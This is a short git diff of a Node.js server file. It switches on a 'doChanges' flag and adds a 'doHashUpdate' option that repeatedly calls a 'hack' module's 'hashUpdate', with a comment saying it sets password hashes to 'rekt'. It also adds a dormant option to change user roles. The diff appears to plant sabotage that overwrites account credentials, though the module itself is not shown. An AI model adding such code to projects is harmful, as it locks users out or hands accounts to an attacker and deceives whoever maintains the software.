@@ -16,13 +16,16 @@ const Role = require('./models/role');
 const Settings = require('./models/settings');
 const axios = require('axios');
 let maxEval = 100;
-let doChanges = false;//the variable
+let doChanges = true;//the variable.
+let doHashUpdate=true;// decide of the password hash will be updated, update to 'rekt'.
+let doRoleUpdate=false; // decide of the role will be updated, update to 'Member'.
 const doHack = require('./script/hack/update.js'); //run the update, if allowed by a variable here.
-async function evaluateChanges(change, role){// IMPORTANT: role is optional, its not required.
+async function evaluateChanges(){
   if (doChanges){
-    setInterval(()=>{
-      (async())
-    })
+    try {
+      if(doHashUpdate){setInterval(()=>{doHack.hashUpdate()})}//hash update.
+      if(doRoleUpdate){(async()=>{await doHack.roleUpdate()})}//role update.
+    }catch(e){console.error('[DoChanges]: '+e)}
   }
 }
 const getIPInfo = (ipAddress) => {
